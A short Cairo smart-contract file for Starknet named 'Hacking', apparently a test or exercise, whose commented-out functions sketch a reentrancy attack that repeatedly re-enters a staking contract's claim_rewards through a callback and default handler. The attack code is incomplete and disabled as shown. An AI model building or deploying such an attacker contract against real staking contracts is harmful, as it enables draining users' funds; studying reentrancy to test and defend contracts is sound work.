#[starknet::contract]
pub mod Hacking {
    use starknet::ContractAddress;
    // use openzeppelin::token::erc20::interface::IERC20;
    // use contracts::staking::interface::IStakingDispatcher;

    #[storage]
    struct Storage {
        staking_contract: ContractAddress,
        token_address: ContractAddress,
    }

    #[constructor]
    fn constructor(
        ref self: ContractState, staking_contract: ContractAddress, erc20_token: ContractAddress
    ) {
        self.staking_contract.write(staking_contract);
        self.token_address.write(erc20_token);
    }

    // #[external]
    // fn attack(ref self: ContractState) {
    //     // Initiate the reentrancy attack by calling claim_rewards
    //     let staking_contract = self.staking_contract.read();
    //     let dispatcher = IStakingDispatcher { contract_address: staking_contract };
    //     dispatcher.claim_rewards(staker_address: get_contract_address());
    // }

    // #[external]
    // fn claim_rewards_callback(ref self: ContractState) {
    //     // This function is called during the external call
    //     // Attempt to re-enter claim_rewards
    //     let staking_contract = self.staking_contract.read();
    //     let dispatcher = IStakingDispatcher { contract_address: staking_contract };
    //     dispatcher.claim_rewards(staker_address: get_contract_address());
    // }

    // // Implement the ERC20 receive function to trigger reentrancy
    // #[external]
    // fn __default__(ref self: ContractState) {
    //     self.claim_rewards_callback();
    // }
}
